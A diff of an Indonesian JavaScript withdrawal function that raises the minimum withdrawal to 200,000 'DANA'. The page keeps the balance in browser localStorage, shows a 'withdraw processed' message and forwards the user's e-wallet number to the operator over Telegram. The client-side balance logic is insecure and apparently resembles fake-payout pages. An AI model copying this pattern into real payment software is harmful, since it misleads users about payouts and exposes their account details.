@@ -252,37 +252,39 @@
         console.error("Gagal kirim Telegram:", err);
       });
     }
-
+  
     function submitWithdraw() {
-      const jumlah = parseFloat(document.getElementById("jumlahWithdraw").value);
-      const nomorDana = document.getElementById("nomorDana").value.trim();
+  const jumlah = parseFloat(document.getElementById("jumlahWithdraw").value);
+  const nomorDana = document.getElementById("nomorDana").value.trim();
 
-      if (isNaN(jumlah) || jumlah <= 0) {
-        tampilkanNotifikasi("Masukkan jumlah DANA yang valid");
-        return;
-      }
+  // Validasi minimal 200.000 DANA
+  if (isNaN(jumlah) || jumlah < 200000) {
+    tampilkanNotifikasi("Minimal withdraw 200.000 DANA");
+    return;
+  }
 
-      if (!nomorDana) {
-        tampilkanNotifikasi("Nomor akun DANA tidak boleh kosong");
-        return;
-      }
+  if (!nomorDana) {
+    tampilkanNotifikasi("Nomor akun DANA tidak boleh kosong");
+    return;
+  }
 
-      if (jumlah > saldoDANA) {
-        tampilkanNotifikasi("Saldo DANA tidak mencukupi");
-        return;
-      }
+  if (jumlah > saldoDANA) {
+    tampilkanNotifikasi("Saldo DANA tidak mencukupi");
+    return;
+  }
 
-      saldoDANA -= jumlah;
-      localStorage.setItem(username + "_totalDANA", saldoDANA);
-      document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
-      
-      tampilkanNotifikasi("✅ Withdraw berhasil diproses");
-      sembunyikanForm();
+  // Proses withdraw
+  saldoDANA -= jumlah;
+  localStorage.setItem(username + "_totalDANA", saldoDANA);
+  document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
+  
+  tampilkanNotifikasi("✅ Withdraw berhasil diproses");
+  sembunyikanForm();
 
-      const pesan = `🔔 *Withdraw Baru!*\n👤 User: ${username}\n💰 Jumlah: ${jumlah.toLocaleString()} DANA\n📱 Nomor DANA: ${nomorDana}\n🕒 Waktu: ${new Date().toLocaleString()}`;
-      kirimTelegramPesan(pesan);
+  const pesan = `🔔 *Withdraw Baru!*\n👤 User: ${username}\n💰 Jumlah: ${jumlah.toLocaleString()} DANA\n📱 Nomor DANA: ${nomorDana}\n🕒 Waktu: ${new Date().toLocaleString()}`;
+  kirimTelegramPesan(pesan);
     }
-    
+
     function prosesTransferEmail() {
       const emailTujuan = document.getElementById("emailTujuan").value.trim().toLowerCase();
       const jumlah = parseFloat(document.getElementById("jumlahTransfer").value);
